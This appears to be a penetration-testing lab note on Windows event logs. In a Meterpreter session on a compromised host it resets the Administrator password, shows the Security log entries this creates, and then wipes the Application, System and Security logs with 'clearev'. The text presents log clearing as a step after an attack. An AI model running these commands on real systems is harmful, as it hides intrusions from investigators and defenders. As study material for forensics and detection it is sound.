# Windows Even Log

The windows OS stores and catalogs all actions/event performed on the system and stored them in the `Windows Event Log.`

`Event Logs` can be categorised based on types of events they store:

- `Application Logs`: Stores application/programs events like startups, crashes etc.

- `System Logs` - Stores event like startup, robots etc.

- `Security Logs` - Stores security events like password changes, authentocation failures etc

Event Logs can be viewed by `Event Viewer` on Windows.

The event logs are the first stop for any forensic investigator after a compromise has been detected. It is therefore very important to clear/remove Event logs after attack.

***********************************************************************************************************************************
# When we change user password we can see it in security event logs

meterpreter > `shell`
Process 3736 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\BadBlue\EE>`net user Administrator password_123`
net user Administrator password_123
The command completed successfully.


C:\Program Files (x86)\BadBlue\EE>

# Below is what we can see Below events in event logs

`An attempt was made to reset an account's password.`

Subject:
	Security ID:		WIN-OMCNBKR66MN\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-OMCNBKR66MN
	Logon ID:		0x41E0C

Target Account:
	Security ID:		WIN-OMCNBKR66MN\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-OMCNBKR66MN


`A user account was changed.`

Subject:
	Security ID:		WIN-OMCNBKR66MN\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-OMCNBKR66MN
	Logon ID:		0x41E0C

Target Account:
	Security ID:		WIN-OMCNBKR66MN\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-OMCNBKR66MN

Changed Attributes:
	SAM Account Name:	Administrator
	Display Name:		<value not set>
	User Principal Name:	-
	Home Directory:		<value not set>
	Home Drive:		<value not set>
	Script Path:		<value not set>
	Profile Path:		<value not set>
	User Workstations:	<value not set>
	Password Last Set:	1/5/2024 3:28:10 PM
	Account Expires:		<never>
	Primary Group ID:	513
	AllowedToDelegateTo:	-
	Old UAC Value:		0x210
	New UAC Value:		0x210
	User Account Control:	-
	User Parameters:	-
	SID History:		-
	Logon Hours:		All

Additional Information:
	Privileges:		-

# Lets clear all these Event logs by `Meterpreter` utility `clearev`

meterpreter > `clearev`
[*] Wiping 258 records from Application...
[*] Wiping 529 records from System...
[*] Wiping 15904 records from Security...
meterpreter > 


# We now have one event log in even viewer

`The audit log was cleared.`
Subject:
	Security ID:	WIN-OMCNBKR66MN\Administrator
	Account Name:	Administrator
	Domain Name:	WIN-OMCNBKR66MN
	Logon ID:	0x402C7